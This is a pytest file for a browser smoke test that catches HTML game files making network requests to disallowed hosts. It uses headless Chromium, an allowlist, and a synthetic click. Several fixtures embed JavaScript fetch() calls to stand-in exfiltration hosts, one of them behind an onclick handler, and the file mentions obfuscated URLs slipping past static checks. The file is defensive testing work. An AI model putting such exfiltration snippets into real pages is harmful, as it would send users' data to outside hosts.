"""Sprint 3 Part A: smoke_test.py runtime network-egress check + synthetic
interaction, so a JS-obfuscated exfiltration URL (never a literal string in
the HTML source for safety.py to match) still gets caught."""

import pytest

import smoke_test

pytest.importorskip("playwright.sync_api")


def _has_chromium():
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch()
            browser.close()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _has_chromium(), reason="Chromium not installed")


# --- _blocked_host(): allowlist logic, testable without a browser ---------

def test_blocked_host_flags_disallowed_https_host():
    assert smoke_test._blocked_host("https://evil.tld/exfil?x=1") == "evil.tld"


def test_blocked_host_allows_allowlisted_cdn_host():
    assert smoke_test._blocked_host("https://cdn.jsdelivr.net/npm/foo/bar.js") is None


def test_blocked_host_ignores_file_uri():
    assert smoke_test._blocked_host("file:///tmp/index.html") is None


def test_blocked_host_ignores_data_uri():
    assert smoke_test._blocked_host("data:image/png;base64,AAAA") is None


def test_blocked_host_ignores_blob_uri():
    assert smoke_test._blocked_host("blob:https://example.com/uuid") is None


# --- run_smoke_test(): end-to-end via headless Chromium --------------------

def test_flags_onload_fetch_to_disallowed_host(tmp_path):
    html = tmp_path / "index.html"
    html.write_text(
        "<script>fetch('https://evil-exfil-test.invalid/steal?x=1')"
        ".catch(()=>{});</script>",
        encoding="utf-8",
    )
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is False
    # Deliberately not asserting *which* guard caught it. The page is served
    # under the real game CSP now, so connect-src 'self' refuses the fetch
    # before the request watcher ever sees it; both paths reject the attempt
    # and both name the host, which is the part that has to hold.
    assert "evil-exfil-test.invalid" in detail


def test_passes_clean_game(tmp_path):
    html = tmp_path / "index.html"
    html.write_text("<canvas></canvas><script>console.log('ok');</script>", encoding="utf-8")
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is True


def test_flags_onclick_exfiltration_via_synthetic_click(tmp_path):
    """Exfiltration gated behind a click still gets caught because
    run_smoke_test() dispatches a synthetic click before its wait."""
    html = tmp_path / "index.html"
    html.write_text(
        "<body onclick=\"fetch('https://evil-onclick-test.invalid/x').catch(()=>{})\">"
        "<div style='width:100vw;height:100vh'></div></body>",
        encoding="utf-8",
    )
    passed, detail = smoke_test.run_smoke_test(str(html), timeout_seconds=10)
    assert passed is False
    assert "evil-onclick-test.invalid" in detail


def test_onclick_exfiltration_not_caught_without_synthetic_interaction(tmp_path):
    """Regression check documenting why the synthetic click/keypress step in
    run_smoke_test() exists: a bare load-and-wait (no interaction) misses
    exfiltration gated behind a click entirely."""
    from playwright.sync_api import sync_playwright

    html = tmp_path / "index.html"
    html.write_text(
        "<body onclick=\"fetch('https://evil-onclick-test.invalid/x').catch(()=>{})\">"
        "<div style='width:100vw;height:100vh'></div></body>",
        encoding="utf-8",
    )
    errors = []
    with sync_playwright() as p:
        browser = p.chromium.launch()
        try:
            page = browser.new_page()
            page.on("pageerror", lambda exc: errors.append(str(exc)))
            page.on(
                "request",
                lambda req: errors.append(req.url)
                if smoke_test._blocked_host(req.url) else None,
            )
            page.goto(f"file://{html.resolve()}", timeout=10000)
            page.wait_for_timeout(1000)  # no click/keypress dispatched
        finally:
            browser.close()
    assert errors == []


# --- the smoke server's own origin is exempt, by origin not by host --------

def test_blocked_host_exempts_the_smoke_servers_own_origin():
    assert smoke_test._blocked_host(
        "http://127.0.0.1:8931/vendor/three/x.js", "http://127.0.0.1:8931") is None


def test_blocked_host_still_reports_other_local_services():
    """Exempting all of 127.0.0.1 would let a game probe whatever else is
    listening on the box; only the smoke server's exact origin is waived."""
    assert smoke_test._blocked_host(
        "http://127.0.0.1:5432/x", "http://127.0.0.1:8931") == "127.0.0.1"


# --- 3D: the whole vendored-engine path, in a real browser ----------------

def test_three_js_game_loads_and_renders(tmp_path):
    """The load-bearing end-to-end check: ES modules resolve through the
    injected import map, the vendored engine is served over the smoke server,
    the game CSP permits it, and WebGL works on the software GPU headless
    Chromium falls back to. Any one of those breaking fails every 3D game."""
    import engines

    html = tmp_path / "index.html"
    html.write_text(engines.normalize(
        '<!DOCTYPE html><html><head><title>3d</title></head><body>'
        '<script type="module">'
        'import * as THREE from "three";'
        'import { OrbitControls } from "three/addons/controls/OrbitControls.js";'
        'const r = new THREE.WebGLRenderer(); r.setSize(200, 200);'
        'document.body.appendChild(r.domElement);'
        'const s = new THREE.Scene();'
        'const c = new THREE.PerspectiveCamera(70, 1, 0.1, 100); c.position.z = 3;'
        'new OrbitControls(c, r.domElement);'
        's.add(new THREE.Mesh(new THREE.BoxGeometry(),'
        ' new THREE.MeshBasicMaterial({color: 0xff0000})));'
        'r.render(s, c);'
        "</script></body></html>", "three"), encoding="utf-8")

    passed, detail = smoke_test.run_smoke_test(
        str(html), timeout_seconds=20, engine="three")
    assert passed, detail
